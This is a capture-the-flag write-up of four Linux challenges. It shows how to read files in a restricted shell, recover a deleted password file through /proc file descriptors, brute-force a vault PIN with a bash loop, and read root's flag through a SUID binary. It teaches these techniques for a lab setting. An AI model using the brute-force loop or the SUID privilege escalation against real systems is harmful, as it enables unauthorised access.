# Challenge: Linux Starter
>Don't Try to break this jail<br>
ssh wolfie@linuxstarter.darkarmy.xyz -p 8001 password : wolfie

## Solution
We get into a `rbash` shell. We run some simple commands and get the flag<br>
```bash
wolfie:~$ cat *
cat: bin: Is a directory
cat: imp: Is a directory
wolfie:~$ cat imp/*
darkCTF{h0pe_y0u_used_intended_w4y}
```
## Flag:
>darkCTF{h0pe_y0u_used_intended_w4y}

# Challenge: Find-me
>Mr.Wolf was doing some work and he accidentally deleted the important file can you help him and read the file?<br>
ssh ctf@findme.darkarmy.xyz -p 10000 password: wolfie

## Solution
As the question suggests about the delete file. I went to `/proc/10/fd` and found 3 files there.
```bash
wolf1@7e6800eb0d43:/proc/10/fd$ ls -la
total 0
dr-x------ 2 wolf1 wolf1  0 Sep 28 14:56 .
dr-xr-xr-x 9 wolf1 wolf1  0 Sep 28 14:56 ..
lr-x------ 1 wolf1 wolf1 64 Sep 28 14:57 0 -> /dev/null
l-wx------ 1 wolf1 wolf1 64 Sep 28 14:57 1 -> /dev/null
l-wx------ 1 wolf1 wolf1 64 Sep 28 14:57 2 -> /dev/null
lr-x------ 1 wolf1 wolf1 64 Sep 28 14:57 3 -> '/home/wolf1/pass (deleted)'
wolf1@7e6800eb0d43:/proc/10/fd$ cat 3
mysecondpassword123
```
I found out there are 2 users in the home directory.
```bash
wolf1@7e6800eb0d43:/home/wolf1$ ls ../
wolf1  wolf2
```
So I used the above password to gain access to `wolf2`. And searched for files in it.
```bash
wolf2@7e6800eb0d43:/home/wolf2$ find . -type f
./.bash_logout
./.bashrc
./.profile
./proc/g/nice_work
wolf2@7e6800eb0d43:/home/wolf2$ cat proc/g/nice_work | rev
}galf eht no gnidnats era uoy{FTCkrad

darkCTF{w0ahh_n1c3_w0rk!!!}
```
## Flag:
>darkCTF{w0ahh_n1c3_w0rk!!!}

# Challenge: Secret Vault ![badge](https://img.shields.io/badge/Post%20CTF-Writeup-success)
>There's a vault hidden find it and retrieve the information. Note: Do not use any automated tools.<br>
ssh ctf@vault.darkarmy.xyz -p 10000

## Solution
I found the vault file
```bash
dark@941b05d2d95a:/home/dark$ find /home -type f
/home/.secretdoor/vault
/home/dark/.bash_logout
/home/dark/.profile
/home/dark/.bashrc
dark@941b05d2d95a:/home/dark$ cd /home/.secretdoor/
dark@941b05d2d95a:/home/.secretdoor$ ls
vault
dark@941b05d2d95a:/home/.secretdoor$ ./vault 1234

wrong pin: 1234
```
Wrote a script to bruteforce PIN
```bash
dark@5a95bae226e7:/home/.secretdoor$ nr=0; while true; do nr=$((nr+1)); if [[ $(./vault $nr) != *"wrong"* ]]; then ./vault $nr; echo $nr; fi; done;

Vault Unlocked :A79Lo6W?O%;D;Qh1NIbJ0lp]#F^no;F)tr9Ci!p(+X)7@ 
8794
```
Base85 decode the string gives the flag.

## Flag:
>darkCTF{R0bb3ry_1s_Succ3ssfullll!!}

# Challenge: Squids ![badge](https://img.shields.io/badge/Post%20CTF-Writeup-success)
>Squids in the linux pool<br>
ssh ctf@squid.darkarmy.xyz -p 10000 password: wolfie

## Solution
I searched a little and I found a interesting SUID binary.
```bash
wolf@04a47f9b0d08:/home/wolf1$ find /opt -type f
/opt/src/src/iamroot
wolf@04a47f9b0d08:/home/wolf1$ cd /opt/src/src/
wolf@04a47f9b0d08:/opt/src/src$ ./iamroot 324
cat: 324: No such file or directory
```
It can run `cat` command as root
```bash
wolf@04a47f9b0d08:/opt/src/src$ ./iamroot /root/flag.txt
darkCTF{y0u_f0und_the_squ1d}
```
## Flag:
> darkCTF{y0u_f0und_the_squ1d}
